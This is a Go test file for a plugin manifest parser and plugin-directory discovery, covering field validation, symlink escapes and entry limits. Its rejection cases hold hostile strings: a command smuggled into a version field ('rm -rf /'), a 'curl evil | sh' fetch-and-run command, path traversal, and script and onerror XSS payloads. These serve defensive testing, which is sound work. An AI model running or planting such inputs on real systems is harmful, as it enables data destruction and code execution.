// SPDX-License-Identifier: Apache-2.0

package plugin

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

const validManifest = `{
  "schema": 1,
  "id": "scan-notes",
  "name": "Scan notes",
  "version": "1.2.3",
  "description": "Writes notes.",
  "rewind_api": 1,
  "capabilities": ["events.library_scan"],
  "author": "Someone",
  "homepage": "https://example.org/scan-notes"
}`

func TestParseValidManifest(t *testing.T) {
	m, err := ParseManifest(strings.NewReader(validManifest))
	if err != nil {
		t.Fatal(err)
	}
	if m.ID != "scan-notes" || m.Version != "1.2.3" || m.RewindAPI != 1 || len(m.Capabilities) != 1 || m.Homepage == "" {
		t.Errorf("manifest = %+v", m)
	}
	// Optional fields may be left out; capabilities may be empty.
	if _, err := ParseManifest(strings.NewReader(`{"schema":1,"id":"a","name":"A","version":"0.1.0","rewind_api":1,"capabilities":[]}`)); err != nil {
		t.Errorf("minimal manifest: %v", err)
	}
}

func TestParseRejectsInvalidManifests(t *testing.T) {
	base := map[string]string{
		"schema": `1`, "id": `"scan-notes"`, "name": `"Scan notes"`, "version": `"1.0.0"`,
		"rewind_api": `1`, "capabilities": `["events.library_scan"]`,
	}
	build := func(over map[string]string) string {
		var parts []string
		for k, v := range base {
			if nv, ok := over[k]; ok {
				v = nv
			}
			if v != "-" {
				parts = append(parts, `"`+k+`":`+v)
			}
		}
		for k, v := range over {
			if _, ok := base[k]; !ok {
				parts = append(parts, `"`+k+`":`+v)
			}
		}
		return "{" + strings.Join(parts, ",") + "}"
	}
	cases := map[string]string{
		"missing id":            build(map[string]string{"id": "-"}),
		"missing name":          build(map[string]string{"name": "-"}),
		"missing version":       build(map[string]string{"version": "-"}),
		"missing capabilities":  build(map[string]string{"capabilities": "-"}),
		"missing rewind_api":    build(map[string]string{"rewind_api": "-"}),
		"unsupported schema":    build(map[string]string{"schema": "2"}),
		"schema 0":              build(map[string]string{"schema": "-"}),
		"upper-case id":         build(map[string]string{"id": `"Scan"`}),
		"id with dots":          build(map[string]string{"id": `"../../etc"`}),
		"id with slash":         build(map[string]string{"id": `"a/b"`}),
		"id leading digit":      build(map[string]string{"id": `"1abc"`}),
		"id double hyphen":      build(map[string]string{"id": `"a--b"`}),
		"id too long":           build(map[string]string{"id": `"` + strings.Repeat("a", 41) + `"`}),
		"version not semver":    build(map[string]string{"version": `"1.0"`}),
		"version with suffix":   build(map[string]string{"version": `"1.0.0; rm -rf /"`}),
		"bad compatibility":     build(map[string]string{"rewind_api": "0"}),
		"compatibility type":    build(map[string]string{"rewind_api": `">=1"`}),
		"unknown capability":    build(map[string]string{"capabilities": `["http.routes"]`}),
		"duplicate capability":  build(map[string]string{"capabilities": `["events.library_scan","events.library_scan"]`}),
		"name control chars":    build(map[string]string{"name": `"a\u0007b"`}),
		"name too long":         build(map[string]string{"name": `"` + strings.Repeat("n", 65) + `"`}),
		"name padded":           build(map[string]string{"name": `" padded "`}),
		"empty name":            build(map[string]string{"name": `""`}),
		"homepage http":         build(map[string]string{"homepage": `"http://example.org"`}),
		"homepage javascript":   build(map[string]string{"homepage": `"javascript:alert(1)"`}),
		"homepage credentials":  build(map[string]string{"homepage": `"https://user:pw@example.org"`}),
		"command field":         build(map[string]string{"command": `"sh -c 'curl evil | sh'"`}),
		"exec path field":       build(map[string]string{"exec": `"/usr/bin/evil"`}),
		"frontend script field": build(map[string]string{"script": `"<script>alert(1)</script>"`}),
		"not an object":         `["id"]`,
		"malformed":             `{"schema":1,`,
		"trailing data":         build(nil) + ` {}`,
		"invalid utf-8":         "{\"schema\":1,\"id\":\"a\",\"name\":\"\xff\",\"version\":\"1.0.0\",\"rewind_api\":1,\"capabilities\":[]}",
		"oversized":             build(map[string]string{"description": `"` + strings.Repeat("x", MaxManifestBytes) + `"`}),
		"description too long":  build(map[string]string{"description": `"` + strings.Repeat("d", 281) + `"`}),
	}
	for name, src := range cases {
		_, err := ParseManifest(strings.NewReader(src))
		var me *ManifestError
		if !errors.As(err, &me) {
			t.Errorf("%s: error = %v, want ManifestError", name, err)
			continue
		}
		// Messages are Rewind's own: they never echo manifest content.
		for _, leak := range []string{"rm -rf", "<script>", "evil", "javascript:", "../"} {
			if strings.Contains(me.Msg, leak) {
				t.Errorf("%s: message echoes manifest content: %q", name, me.Msg)
			}
		}
	}
}

func TestManifestTextIsData(t *testing.T) {
	// HTML in display fields is allowed as text: it is never rendered as
	// HTML (the API sends JSON, the UI renders text).
	m, err := ParseManifest(strings.NewReader(strings.Replace(validManifest, `"Scan notes"`, `"<img src=x onerror=alert(1)>"`, 1)))
	if err != nil || m.Name != "<img src=x onerror=alert(1)>" {
		t.Errorf("manifest = %+v, %v", m, err)
	}
}

// --- discovery ---

func writeManifest(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(dir, name), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name, ManifestFile), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func manifestFor(id, version string, caps ...string) string {
	if caps == nil {
		caps = []string{}
	}
	q := make([]string, len(caps))
	for i, c := range caps {
		q[i] = `"` + c + `"`
	}
	return `{"schema":1,"id":"` + id + `","name":"Plugin ` + id + `","version":"` + version +
		`","rewind_api":1,"capabilities":[` + strings.Join(q, ",") + `]}`
}

func TestDiscoverMissingDirectory(t *testing.T) {
	_, err := Discover(filepath.Join(t.TempDir(), "absent"))
	if !errors.Is(err, ErrNoDirectory) {
		t.Errorf("error = %v, want ErrNoDirectory", err)
	}
}

func TestDiscoverEntries(t *testing.T) {
	dir := t.TempDir()
	writeManifest(t, dir, "good", manifestFor("good", "1.0.0"))
	writeManifest(t, dir, "mismatch", manifestFor("other", "1.0.0"))
	writeManifest(t, dir, "Bad_Name", manifestFor("bad-name", "1.0.0"))
	writeManifest(t, dir, "broken", `{"schema":1,`)
	os.MkdirAll(filepath.Join(dir, "empty"), 0o755)
	os.MkdirAll(filepath.Join(dir, ".hidden"), 0o755)
	os.WriteFile(filepath.Join(dir, "README.txt"), []byte("notes"), 0o644)
	big := filepath.Join(dir, "big")
	os.MkdirAll(big, 0o755)
	os.WriteFile(filepath.Join(big, ManifestFile), []byte(strings.Repeat(" ", MaxManifestBytes+1)), 0o644)

	found, err := Discover(dir)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, f := range found {
		if f.Err != nil {
			got[f.Dir] = f.Err.Error()
		} else {
			got[f.Dir] = "ok"
		}
	}
	want := map[string]string{
		"good":     "ok",
		"mismatch": "the manifest's id does not match its directory name",
		"Bad_Name": "the directory name must be the plugin's ID (lower-case letters, digits and hyphens)",
		"broken":   "manifest is not a valid JSON object",
		"empty":    "plugin.json is missing",
		"big":      "plugin.json is larger than 16384 bytes",
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s: %q, want %q", k, got[k], v)
		}
	}
	if len(got) != len(want) {
		t.Errorf("entries = %v; hidden entries and plain files must be ignored", got)
	}
	// Sorted, deterministic order.
	for i := 1; i < len(found); i++ {
		if found[i-1].Dir > found[i].Dir {
			t.Errorf("not sorted: %q before %q", found[i-1].Dir, found[i].Dir)
		}
	}
}

func TestDiscoverDoesNotFollowLinksOutside(t *testing.T) {
	dir := t.TempDir()
	outside := t.TempDir()
	writeManifest(t, outside, "evil", manifestFor("evil", "1.0.0"))
	// A plugin directory that is a symlink to a directory elsewhere.
	if err := os.Symlink(filepath.Join(outside, "evil"), filepath.Join(dir, "evil")); err != nil {
		if runtime.GOOS != "windows" {
			t.Fatal(err)
		}
		// Symlinks need a privilege on Windows; a directory junction does not
		// and redirects just the same.
		if out, err := exec.Command("cmd", "/c", "mklink", "/J", filepath.Join(dir, "evil"), filepath.Join(outside, "evil")).CombinedOutput(); err != nil {
			t.Fatalf("mklink /J: %v %s", err, out)
		}
		found, err := Discover(dir)
		if err != nil {
			t.Fatal(err)
		}
		if len(found) != 1 || found[0].Err == nil {
			t.Fatalf("junction to a directory outside was accepted: %+v", found)
		}
		t.Logf("junction rejected: %v", found[0].Err)
		return
	}
	// A real plugin directory whose manifest is a symlink to a file elsewhere.
	os.MkdirAll(filepath.Join(dir, "sneaky"), 0o755)
	writeManifest(t, outside, "sneaky", manifestFor("sneaky", "1.0.0"))
	if err := os.Symlink(filepath.Join(outside, "sneaky", ManifestFile), filepath.Join(dir, "sneaky", ManifestFile)); err != nil {
		t.Fatal(err)
	}
	found, err := Discover(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(found) != 2 {
		t.Fatalf("found = %+v", found)
	}
	for _, f := range found {
		if f.Err == nil {
			t.Errorf("%s: a symlinked entry was accepted", f.Dir)
		}
	}
}

func TestDiscoverBoundsEntries(t *testing.T) {
	dir := t.TempDir()
	for i := 0; i < MaxEntries+5; i++ {
		os.MkdirAll(filepath.Join(dir, "p"+strings.Repeat("a", i%3)+string(rune('a'+i%26))+string(rune('a'+i/26))), 0o755)
	}
	found, err := Discover(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(found) != MaxEntries+1 || found[MaxEntries].Err == nil || !strings.Contains(found[MaxEntries].Err.Error(), "more than 64") {
		t.Errorf("found %d entries; last = %+v", len(found), found[len(found)-1])
	}
}
